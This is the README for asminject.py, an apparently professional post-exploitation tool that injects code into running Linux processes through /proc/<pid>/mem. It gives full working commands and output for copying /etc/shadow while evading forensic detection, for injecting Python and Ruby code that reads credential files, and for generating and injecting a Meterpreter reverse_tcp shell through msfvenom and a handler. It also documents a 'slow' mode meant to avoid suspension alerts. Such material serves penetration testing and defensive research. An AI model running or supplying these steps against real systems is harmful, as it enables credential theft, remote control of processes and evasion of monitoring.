# asminject.py
*asminject.py* is a heavily-modified fork of [David Buchanan's dlinject project](https://github.com/DavidBuchanan314/dlinject). Injects arbitrary assembly (or precompiled binary) payloads directly into Linux processes without the use of ptrace by accessing /proc/&lt;pid>/mem. Useful for certain post-exploitation scenarios, recovering content from process memory when ptrace is not available, and bypassing some security controls. Can inject into containerized processes from outside of the container, as long as you have root access on the host.

This is a very early, alpha-quality version of this utility.

* [Origins](#origins)
* [Setup](#setup)
* [Examples](#examples)
* [Features](#features)
* [Version History](#version-history)

## Origins

When the first version of *asminject.py* was written, *dlinject.py* was broken on modern Linux distributions because GNU had hidden the library-loading function in *ld-x.y.so* hidden. Regardless, the ability to inject arbitrary machine code is arguably stealthier.

## Setup

It's possible to write payloads in pure assembly without referring to libraries. If you're doing that, or using the example payloads that do that, or using a binary payload generated by e.g. *msfvenom*, you can skip this section.

Otherwise, you'll need to examine the list of binaries and libraries that your target process is using, e.g.:

```
# ps auxww | grep python2

user     2144330  0.2  0.1  13908  7864 pts/2    S+   15:30   0:00 python2 ./calling_script.py
                                                                                                                                    
# cat /proc/2144330/maps

560a14849000-560a14896000 r--p 00000000 08:01 3024520                    /usr/bin/python2.7
...omitted for brevity...
7fc63884b000-7fc638870000 r--p 00000000 08:01 3032318                    /usr/lib/x86_64-linux-gnu/libc-2.31.so
...omitted for brevity...
7fc638a10000-7fc638a1f000 r--p 00000000 08:01 3032320                    /usr/lib/x86_64-linux-gnu/libm-2.31.so
...omitted for brevity...
7fc638b54000-7fc638b57000 r--p 00000000 08:01 3016732                    /usr/lib/x86_64-linux-gnu/libz.so.1.2.11
...omitted for brevity...
7fc638b71000-7fc638b72000 r--p 00000000 08:01 3032333                    /usr/lib/x86_64-linux-gnu/libutil-2.31.so
...omitted for brevity...
7fc638b76000-7fc638b77000 r--p 00000000 08:01 3032319                    /usr/lib/x86_64-linux-gnu/libdl-2.31.so
...omitted for brevity...
7fc638b7c000-7fc638b83000 r--p 00000000 08:01 3032329                    /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
...omitted for brevity...
7fc638bc3000-7fc638bc4000 r--p 00000000 08:01 3031631                    /usr/lib/x86_64-linux-gnu/ld-2.31.so                                                                                                               
```

In this case, you could safely call exported functions in eight different binaries. Most of the example payloads will only use one or two, and will match their names based on regexes, but you'll still need to generate a list of the offsets for *asminject* to use. E.g. for this specific copy of */usr/bin/python2.7*:

```
readelf -a --wide /usr/bin/python2.7 | grep DEFAULT | grep FUNC | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | cut -d" " -f3,9 > relative_offsets-some_machine-python2.7.txt
```

If you are injecting code into a containerized process from outside the container, you'll need to use the copy of each binary *from inside the container*, or you'll get the wrong data.

## Examples

### Create a world-readable copy of a file using only Linux syscalls

This code requires no relative offset information, because it's all done using Linux syscalls. It may also help avoid some methods of forensic detection versus using the *cp*, *cat*, or other commands.

```
# python3 ./asminject.py 1544016 asm/x86-64/copy_file_using_syscalls.s --var sourcefile "/etc/shadow" --var destfile "/tmp/shadow_copied_using_syscalls.txt" --stop-method "slow" --pause false --stage-mode mem

                     .__            __               __
  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
 / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
        \/                   \/\______|    \/     \/     \/|__|   \/

asminject.py
v0.3
Ben Lincoln, Bishop Fox, 2021-08-30
https://github.com/BishopFox/asminject
based on dlinject, which is Copyright (c) 2019 David Buchanan
dlinject source: https://github.com/DavidBuchanan314/dlinject

...omitted for brevity...
[*] Waiting for stage 1
[*] RSP is 0x00007ffdd7d1bba8
[*] Value at RSP is 0x0000000000000000
[*] MMAP'd block is 0x00007f44f259c000
[*] Writing stage 2 to 0x00007f44f259c000 in target memory
[*] Writing 0x01 to 0x00007ffdd7d1bba8 in target memory to indicate OK
[*] Stage 2 proceeding
[*] Returning to normal time...
[*] Setting process priority for asminject.py (PID: 1544030) to 0
[*] Setting process priority for target process (PID: 1544016) to 0
[*] Setting CPU affinity for target process (PID: 1544016) to [0, 1]
[+] Done!
                                                                                                                                                     
# ls -al /tmp

...omitted for brevity...
-rwxr-xr-x  1 root       root        1766 Aug 31 11:56 shadow_copied_using_syscalls.txt
...omitted for brevity...
                                                                                                                                                     
# cat /tmp/shadow_copied_using_syscalls.txt 

root:!:18704:0:99999:7:::
daemon:*:18704:0:99999:7:::
bin:*:18704:0:99999:7:::
sys:*:18704:0:99999:7:::
sync:*:18704:0:99999:7:::
...omitted for brevity...
```

### Execute arbitrary Python code inside an existing Python process

Launch a harmless Python process that simulates one with access to super-secret, sensitive data. Note the use of *python2* specifically. For *python3* target  processes, you'll most likely need to use the *--non-pic-binary* option discussed later in this document.

```
$ sudo python2 ./calling_script.py

('args:', ['test of example_class_1'])
[example_method_1] Example input was: test of example_class_1
Press enter to exit when finished
```

In a separate terminal, locate the process and inject some arbitrary Python code into it:

```
# ps auxww | grep python2

user     2144294  0.5  0.1  13908  7828 pts/2    S+   15:20   0:00 python2 ./calling_script.py

# python3 ./asminject.py 2144294 asm/x86-64/execute_python_code.s --relative-offsets relative_offsets-some_machine-python2.7.txt --pause --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();"

...omitted for brevity...
[*] Writing assembled binary to /tmp/tmpw5w72z5m.o
[*] Wrote first stage shellcode
[*] Using '/usr/bin/python2.7' for regex placeholder '.+/python[0-9\.]+$' in assembly code
[*] Writing assembled binary to /tmp/tmpzc7wee_q.o
[*] Wrote stage 2 to '/tmp/tmp12ouuz74'
[*] If the target process is operating with a different filesystem root, copy the stage 2 binary to '/tmp/tmp12ouuz74' in the target container before proceeding
Press Enter to continue...
```

If the target process is a container, copy the binary into its filesystem at this time, then press Enter. Otherwise, just go ahead and press Enter.

```
[*] Continuing process...
[+] Done!
```

Back in the other terminal window, run the *fg* command. Python may segfault, but...

```
# cat /tmp/bishopfox.txt 
root:!:18704:0:99999:7:::
daemon:*:18704:0:99999:7:::
bin:*:18704:0:99999:7:::
sys:*:18704:0:99999:7:::
```

### Execute arbitrary Ruby code inside an existing Ruby process

Ruby has a similar "compile and execute this sequence of Ruby source code" method. The current code for it in *asminject.py* has a few limitations, but it does work:

* No ability to require additional Ruby gems
* The targeted process will lock up after the injected code finishes executing

```
# python3 ./asminject.py 1639664 /asm/x86-64/execute_ruby_code.s --relative-offsets relative_offsets-copyroom-libruby-2.7.so.2.7.3-2021-09-01.txt --var rubycode "File.binwrite('/home/user/copied_using_ruby.txt', data = File.binread('/etc/passwd'))" --var rubyargv "/usr/bin/ruby" --stop-method "slow" --pause false --stage-mode mem

...omitted for brevity...
[*] Wrote first stage shellcode at 00007fcf9ab0149b in target process 1639664
[*] Using '/usr/lib/x86_64-linux-gnu/libruby-2.7.so.2.7.3' for regex placeholder '.+/libruby[0-9\.so\-]+$' in assembly code
[*] Writing assembled binary to /tmp/tmp7wxbeztc.o
[*] RSP is 0x00007ffe8da03670
[*] Value at RSP is 0x00007ffe8da03690
[*] MMAP'd block is 0x00005598bbaa9228
[*] Waiting for stage 1
[*] RSP is 0x00007ffe8da03670
[*] Value at RSP is 0x00007ffe8da03690
[*] MMAP'd block is 0x00005598bbaa9228
[*] Waiting for stage 1
[*] RSP is 0x00007ffe8da035d0
[*] Value at RSP is 0x0000000000000000
[*] MMAP'd block is 0x00007fcf9af40000
[*] Writing stage 2 to 0x00007fcf9af40000 in target memory
[*] Writing 0x01 to 0x00007ffe8da035d0 in target memory to indicate OK
[*] Stage 2 proceeding
[*] Returning to normal time...
[*] Setting process priority for asminject.py (PID: 1639670) to 0
[*] Setting process priority for target process (PID: 1639664) to 0
[*] Setting CPU affinity for target process (PID: 1639664) to [0, 1]
[+] Done!
                                                                                                                                                     

# ls -al /home/user/copied_using_ruby.txt 
-rw-r--r-- 1 user user 3472 Sep  1 18:01 /home/user/copied_using_ruby.txt

# cat /home/user/copied_using_ruby.txt 
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...omitted for brevity...
```


### Inject Meterpreter into an existing process

Launch a harmless process that simulates one with access to super-secret, sensitive data:

```
$ sudo python2 ./calling_script.py

('args:', ['test of example_class_1'])
[example_method_1] Example input was: test of example_class_1
Press enter to exit when finished
```

In a separate terminal, generate a Meterpreter payload, then launch a listener:

```
# msfvenom -p linux/x64/meterpreter/reverse_tcp -f raw -o lmrt11443 LHOST=127.0.0.1 LPORT=11443

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Saved as: lmrt11443

# msfconsole

...omitted for brevity...
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf6 exploit(multi/handler) > set LPORT 11443
LPORT => 11443
msf6 exploit(multi/handler) > exploit

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:11443 
```

In a third terminal, locate the process and inject the Meterpreter payload into it:

```
# ps auxww | grep python2

root     2144475  0.0  0.1  10644  5172 pts/2    S+   15:44   0:00 sudo python2 ./calling_script.py
root     2144476  0.5  0.2  13884  8088 pts/2    S+   15:44   0:00 python2 ./calling_script.py

# python3 ./asminject.py 2144476 asminject/lmrt11443 --pause --precompiled

...omitted for brevity...
[*] Writing assembled binary to /tmp/tmp78ods3rv.o
[*] Wrote first stage shellcode
[*] Wrote stage 2 to '/tmp/tmpcmwfovsm'
[*] If the target process is operating with a different filesystem root, copy the stage 2 binary to '/tmp/tmpcmwfovsm' in the target container before proceeding
Press Enter to continue...
[*] Continuing process...
[+] Done!
```

In the first terminal, run the *fg* command, and you should see the following pop up in the third terminal:

```
[*] Sending stage (3008420 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:11443 -> 127.0.0.1:53682) at 2021-06-07 14:44:14 -0700

meterpreter > sysinfo
Computer     : 192.168.218.135
OS           : Debian  (Linux 5.10.0-kali3-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux

```

### Create a copy of a file using buffered read/write libc calls

If you don't mind making library calls, writing custom code is much easier. This example uses code that (like the first example) creates a copy of a file, but by using libc's fopen(), fread(), fwrite(), and fclose() instead of syscalls, can easily use a buffered approach that's more efficient.

```
# python3 ./asminject.py 1544597 asm/x86-64/copy_file_using_libc.s --var sourcefile "/etc/passwd" --var destfile "/tmp/copied_using_libc.txt" --stop-method "slow" --relative-offsets asminject/relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.31.so-2021-08-30.txt --pause false --stage-mode mem

...omitted for brevity...
[*] RSP is 0x00007ffd39d25208
[*] Value at RSP is 0x00005568364980b4
[*] MMAP'd block is 0x00000001368bd209
[*] Wrote first stage shellcode at 00007f1f121331c6 in target process 1544597
[*] Using '/usr/lib/x86_64-linux-gnu/libc-2.31.so' for regex placeholder '.+/libc-2.[0-9]+.so$' in assembly code
[*] Writing assembled binary to /tmp/tmp0zvbe4b3.o
[*] RSP is 0x00007ffd39d25168
[*] Value at RSP is 0x0000000000000000
[*] MMAP'd block is 0x00007f1f12279000
[*] Writing stage 2 to 0x00007f1f12279000 in target memory
[*] Writing 0x01 to 0x00007ffd39d25168 in target memory to indicate OK
[*] Stage 2 proceeding
...omitted for brevity...
[+] Done!

# cat /tmp/copied_using_libc.txt

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...omitted for brevity...
```


## Features

### Using "slow" mode to help avoid triggering alerts related to process suspension

*asminject.py* supports four methods for pre/post-injection handling of the target process. Three of those methods are borrowed from the original [dlinject.py](https://github.com/DavidBuchanan314/dlinject):

* Send a suspend (SIGSTOP) signal before injection, and a resume (SIGCONT) message after injection
** This is reliable, but is somewhat intrusive. Very paranoid software might use it as an indication of tampering
* For containerized systems, using *cgroups* "freezing"
** Reliable, but not an option for non-containerized systems
* Do nothing and hope the target process doesn't step on the injected code while it's being written
** Unreliable

*asminject.py* adds a fourth option: increasing the priority of its own process and decreasing the priority of the target process. This "slow" mode generally allows it to act like [Quicksilver in _X-Men: Days of Future Past_](https://youtu.be/T9GFyZ5LREQ?t=32), making its changes to the target process at lightning speed. The target process is still running, but so slowly relative to *asminject.py* that it may as well be suspended.

```
# python3 ./asminject.py 1470158 asm/x86-64/execute_python_code-01.s --relative-offsets asminject/relative_offsets-copyroom-usr-bin-python2.7-2021-08-30.txt --relative-offsets asminject/relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.31.so-2021-08-30.txt --var pythoncode "print('OK');"  --stop-method "slow" --pause false

...omitted for brevity...
[*] Switching to super slow motion, like every late 1990s/early 2000s action film director did after seeing _The Matrix_...
[*] Current process priority for asminject.py (PID: 1470165) is 0
[*] Current CPU affinity for asminject.py (PID: 1470165) is [0, 1]
[*] Current process priority for target process (PID: 1470158) is 0
[*] Current CPU affinity for target process (PID: 1470158) is [0, 1]
[*] Setting process priority for asminject.py (PID: 1470165) to -20
[*] Setting process priority for target process (PID: 1470158) to 20
[*] Setting CPU affinity for target process (PID: 1470158) to [0, 1]
...omitted for brevity...
[*] Wrote stage 2 to '/tmp/tmppjmn1rr6'
[*] Returning to normal time...
[*] Setting process priority for asminject.py (PID: 1470165) to 0
[*] Setting process priority for target process (PID: 1470158) to 0
[*] Setting CPU affinity for target process (PID: 1470158) to [0, 1]
[+] Done!

```

### Specifying non-PIC code

Some binaries are compiled without the position-independent code build option (including, strangely enough, Python 3.x, even though 2.x had it enabled). This means that the offsets in the corresponding ELF are absolute instead of relative to the base address. If *asminject.py* detects a low base address (typically indicative of this condition), it will include a warning:

```
[*] '/usr/bin/python3.9' has a base address of 4194304, which is very low for position-independent code. If the exploit attempt fails, try adding --non-pic-binary "/usr/bin/python3.9" to your asminject.py options.
```

As the message indicates, this type of binary can be manually flagged using one or more *--non-pic-binary* options, which are parsed as regular expressions. e.g.:

```
# python3 ./asminject.py 1470214 asm/x86-64/execute_python_code-01.s --relative-offsets asminject/relative_offsets-copyroom-usr-bin-python3.9-2021-08-30.txt --relative-offsets asminject/relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.31.so-2021-08-30.txt --var pythoncode "print('OK');" --non-pic-binary "/usr/bin/python3\\.[0-9]+" --stop-method "slow" --pause false

...omitted for brevity...
[*] Handling '/usr/bin/python3.9' as non-PIC binary
[*] /usr/bin/python3.9: 0x0000000000000000
...omitted for brevity...
[+] Done!

```

### Using memory-only staging

*asminject.py* currently defaults to a file-based second stage (based on the one in *dlinject.py*), but supports memory-only staging as well:

```
# python3 ./asminject.py 1472534 asm/x86-64/execute_python_code-01.s --relative-offsets relative_offsets-copyroom-usr-bin-python2.7-2021-08-30.txt --relative-offsets relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.31.so-2021-08-30.txt --var pythoncode "print('OK');"  --stop-method "slow" --pause false --stage-mode mem

...omitted for brevity...
[*] Writing assembled binary to /tmp/tmprdbl1tj9.o
[*] RSP is 0x00007ffd409c1278
[*] Value at RSP is 0x00007f89ea2d489a
[*] MMAP'd block is 0x00007f89e9dc8b14
[*] Wrote first stage shellcode at 00007f89ea341e8e in target  [rpcess ,e,pru
[*] Using '/usr/lib/x86_64-linux-gnu/libc-2.31.so' for regex placeholder '.+/libc-2.31.so$' in assembly code
[*] Using '/usr/bin/python2.7' for regex placeholder '.+/python[0-9\.]+$' in assembly code
[*] Writing assembled binary to /tmp/tmpqft8zspj.o
[*] RSP is 0x00007ffd409c1278
[*] Value at RSP is 0x00007f89ea2d489a
[*] MMAP'd block is 0x00007f89e9dc8b14
[*] Waiting for stage 1
[*] RSP is 0x00007ffd409c1278
[*] Value at RSP is 0x00007f89ea2d489a
[*] MMAP'd block is 0x00007f89e9dc8b14
[*] Waiting for stage 1
[*] RSP is 0x00007ffd409c1278
[*] Value at RSP is 0x00007f89ea2d489a
[*] MMAP'd block is 0x00007f89e9dc8b14
[*] Waiting for stage 1
[*] RSP is 0x00007ffd409c1278
[*] Value at RSP is 0x00007f89ea2d489a
[*] MMAP'd block is 0x00007f89e9dc8b14
[*] Waiting for stage 1
[*] Couldn't retrieve current syscall values
[*] Waiting for stage 1
[*] Couldn't retrieve current syscall values
[*] Waiting for stage 1
[*] RSP is 0x00007ffd409c11d8
[*] Value at RSP is 0x0000000000000000
[*] MMAP'd block is 0x00007f89ea5c4000
[*] Writing stage 2 to 0x00007f89ea5c4000 in target memory
[*] Writing 0x01 to 0x00007ffd409c11d8 in target memory to indicate OK
[*] Stage 2 proceeding
[*] Returning to normal time...
[*] Setting process priority for asminject.py (PID: 1472539) to 0
[*] Setting process priority for target process (PID: 1472534) to 0
[*] Setting CPU affinity for target process (PID: 1472534) to [0, 1]
[+] Done!

```

### But what about Yama's ptrace_scope restrictions?

If you are an authorized administrator of a Linux system where someone has accidentally set */proc/sys/kernel/yama/ptrace_scope* to 3, or are conducting an authorized penetration test of an environment where that value has been set, see the <a href="ptrace_scope_kernel_module/">ptrace_scope_kernel_module directory</a>.

## Version history

### 0.6 (2021-09-01)

* Still an internal development build
* Added Ruby injection code
* Improved reliability
* A few other bug fixes

### 0.5 (2021-08-31)

* Still an internal development build
* Added copy-file-using-libc code

### 0.4 (2021-08-31)

* Still an internal development build
* Added copy-file-using-syscalls code

### 0.3 (2021-08-30)

* Still an internal development build
* Implemented "mem" staging method

### 0.2 (2021-08-30)

* Still an internal development build
* Implemented "slow" stop method
* Implemented support for non-PIC binaries, like Python 3.x
* Various bug fixes

### 0.1 (2021-06-07)

* Internal development build
